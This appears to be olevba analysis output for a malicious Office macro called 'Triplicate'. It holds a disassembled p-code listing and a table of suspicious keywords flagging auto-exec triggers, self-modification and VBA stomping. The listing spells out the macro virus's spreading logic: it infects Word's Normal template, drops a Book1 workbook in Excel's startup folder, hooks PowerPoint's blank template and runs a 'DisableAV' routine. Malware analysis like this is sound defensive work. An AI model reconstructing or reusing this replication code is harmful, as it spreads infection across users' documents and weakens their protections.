' 	LitDI2 0x0001 
' 	Ld TW 
' 	MemLd CountOfLines 
' 	Ld TW 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld Book1Obj 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #101:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Book1Obj 
' 	ArgsMemCall SaveAs 0x0003 
' Line #102:
' 	Ld Book1Obj 
' 	ArgsMemCall Close 0x0000 
' Line #103:
' 	Ld xlApp 
' 	ArgsMemCall Quit 0x0000 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AW 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0010 "'<!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #106:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld TW 
' 	MemLd CountOfLines 
' 	Ld TW 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AW 
' 	ArgsMemCall InsertLines 0x0002 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Private Sub actionhook(tristate))
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	Ld Rnd 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #112:
' 	SetStmt 
' 	Ld ActivePresentation 
' 	Set Home 
' Line #113:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000F "\Xlstart\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #114:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #115:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #116:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #117:
' 	LitVarSpecial (True)
' 	St WQuit 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #120:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #121:
' 	LitDI2 0x0001 
' 	LitStr 0x0016 "Public Sub DisableAV()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0017 
' 	LitDI2 0x0003 
' 	LitStr 0x000A "Triplicate"
' 	Ld Home 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0026 
' 	LitDI2 0x0003 
' 	LitStr 0x000A "Triplicate"
' 	Ld Home 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #122:
' 	LitStr 0x001D "Normal.ThisDocument.DisableAV"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #123:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #124:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000A "Triplicate"
' 	Ld Home 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x000A "Triplicate"
' 	Ld Home 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #125:
' 	LitDI2 0x0076 
' 	LitStr 0x0020 "Private Sub actionhook(tristate)"
' 	Ld NT 
' 	ArgsMemCall replaceline 0x0002 
' Line #126:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #127:
' 	Ld WQuit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #128:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set xlApp 
' Line #129:
' 	SetStmt 
' 	Ld xlApp 
' 	MemLd Workbooks 
' 	MemLd Add 
' 	Set Book1Obj 
' Line #130:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000A "Triplicate"
' 	Ld Home 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x000A "Triplicate"
' 	Ld Home 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld Book1Obj 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #131:
' 	LitDI2 0x0076 
' 	LitStr 0x0020 "Private Sub actionhook(tristate)"
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld Book1Obj 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #132:
' 	Ld xlApp 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	Ld Book1Obj 
' 	ArgsMemCall SaveAs 0x0001 
' Line #133:
' 	Ld Book1Obj 
' 	ArgsMemCall Close 0x0000 
' Line #134:
' 	Ld xlApp 
' 	ArgsMemCall Quit 0x0000 
' Line #135:
' 	SetStmt 
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0024 "\..\Templates\Blank Presentation.pot"
' 	Add 
' 	ParamOmitted 
' 	ParamOmitted 
' 	Ld msoFalse 
' 	Ld Presentations 
' 	ArgsMemLd Option 0x0004 
' 	Set PBT 
' Line #136:
' 	LitVarSpecial (False)
' 	St dontadd 
' Line #137:
' 	StartForVariable 
' 	Ld ModComponent 
' 	EndForVariable 
' 	Ld PBT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #138:
' 	Ld ModComponent 
' 	MemLd New 
' 	LitStr 0x000A "Triplicate"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St dontadd 
' 	EndIf 
' Line #139:
' 	StartForVariable 
' 	Next 
' Line #140:
' 	Ld dontadd 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #141:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld PBT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set NewMod 
' Line #142:
' 	LitStr 0x000A "Triplicate"
' 	Ld NewMod 
' 	MemSt New 
' Line #143:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000A "Triplicate"
' 	Ld Home 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x000A "Triplicate"
' 	Ld Home 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NewMod 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #144:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld PBT 
' 	MemLd PageSetup 
' 	MemLd SlideWidth 
' 	Ld PBT 
' 	MemLd PageSetup 
' 	MemLd SlideHeight 
' 	Ld PBT 
' 	MemLd SlideMaster 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	Set ShapetoWack 
' Line #145:
' 	StartWithExpr 
' 	Ld ShapetoWack 
' 	With 
' Line #146:
' 	LitStr 0x000A "Triplicate"
' 	MemStWith New 
' Line #147:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsMemCallWith ZOrder 0x0001 
' Line #148:
' 	LitVarSpecial (False)
' 	MemLdWith Like 
' 	MemSt Visible 
' Line #149:
' 	LitVarSpecial (False)
' 	MemLdWith Fill 
' 	MemSt Visible 
' Line #150:
' 	LitDI2 0x0008 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith ActionSettings 0x0001 
' 	MemSt Action 
' Line #151:
' 	LitStr 0x000A "actionhook"
' 	LitDI2 0x0001 
' 	ArgsMemLdWith ActionSettings 0x0001 
' 	MemSt Run 
' Line #152:
' 	EndWith 
' Line #153:
' 	Ld PBT 
' 	ArgsMemCall Save 0x0000 
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	Ld PBT 
' 	ArgsMemCall Close 0x0000 
' Line #156:
' 	EndIfBlock 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

